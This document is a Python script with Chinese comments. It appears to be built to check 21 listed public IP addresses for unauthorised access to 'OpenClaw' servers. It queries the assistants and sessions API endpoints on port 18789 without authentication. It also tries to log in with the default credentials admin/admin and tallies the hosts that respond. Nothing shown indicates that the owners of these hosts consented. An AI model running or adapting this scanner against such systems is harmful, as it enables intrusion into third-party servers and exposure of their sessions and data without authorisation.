#!/usr/bin/env python3
"""
OpenClaw 未授权访问漏洞验证脚本
目标：验证 21 个高危漏洞
"""

import requests
import json
from datetime import datetime

# 21 个漏洞目标
targets = [
    "101.32.254.187", "103.122.5.202", "104.131.105.148",
    "104.131.164.32", "104.131.63.123", "118.196.65.185",
    "13.212.155.170", "134.122.46.173", "134.199.194.220",
    "134.199.232.158", "134.209.100.220", "138.68.152.205",
    "138.68.66.149", "142.93.167.92", "152.42.197.31",
    "157.245.11.65", "159.223.57.60", "160.187.146.70",
    "167.71.155.225", "3.97.131.16", "38.150.2.10"
]

def verify_vuln(ip, port=18789):
    """验证单个目标"""
    results = []
    
    # 测试 1: /api/assistants 未授权访问
    try:
        resp = requests.get(f"http://{ip}:{port}/api/assistants", timeout=5)
        if resp.status_code == 200 and ('assistants' in resp.text.lower() or 'openclaw' in resp.text.lower()):
            results.append({
                'vuln': '未授权 API 访问',
                'endpoint': '/api/assistants',
                'status': '存在漏洞',
                'response_code': resp.status_code
            })
    except Exception as e:
        results.append({
            'endpoint': '/api/assistants',
            'status': '无法访问',
            'error': str(e)
        })
    
    # 测试 2: /api/sessions 未授权访问
    try:
        resp = requests.get(f"http://{ip}:{port}/api/sessions", timeout=5)
        if resp.status_code == 200 and ('sessions' in resp.text.lower() or 'openclaw' in resp.text.lower()):
            results.append({
                'vuln': '未授权 API 访问',
                'endpoint': '/api/sessions',
                'status': '存在漏洞',
                'response_code': resp.status_code
            })
    except Exception as e:
        results.append({
            'endpoint': '/api/sessions',
            'status': '无法访问',
            'error': str(e)
        })
    
    # 测试 3: 默认凭证 admin/admin
    try:
        resp = requests.post(
            f"http://{ip}:{port}/api/auth/login",
            json={"username": "admin", "password": "admin"},
            timeout=5
        )
        if resp.status_code == 200 and 'token' in resp.text.lower():
            results.append({
                'vuln': '默认凭证',
                'endpoint': '/api/auth/login',
                'credentials': 'admin/admin',
                'status': '存在漏洞'
            })
    except:
        pass
    
    return results

if __name__ == "__main__":
    print(f"开始验证 {len(targets)} 个目标...")
    print(f"时间：{datetime.now()}")
    print("-" * 60)
    
    verified = 0
    vulnerable = 0
    
    for i, ip in enumerate(targets, 1):
        print(f"\n[{i}/{len(targets)}] 验证 {ip}...")
        results = verify_vuln(ip)
        
        for r in results:
            if r.get('status') == '存在漏洞':
                vulnerable += 1
                print(f"  ✅ {r.get('endpoint')}: {r.get('vuln', '漏洞')}")
            verified += 1
        
        if verified % 5 == 0:
            print(f"\n进度：{verified} 个端点，发现 {vulnerable} 个漏洞")
    
    print("\n" + "=" * 60)
    print(f"验证完成！")
    print(f"总端点：{verified}")
    print(f"存在漏洞：{vulnerable}")
    print(f"漏洞率：{vulnerable/verified*100:.1f}%")
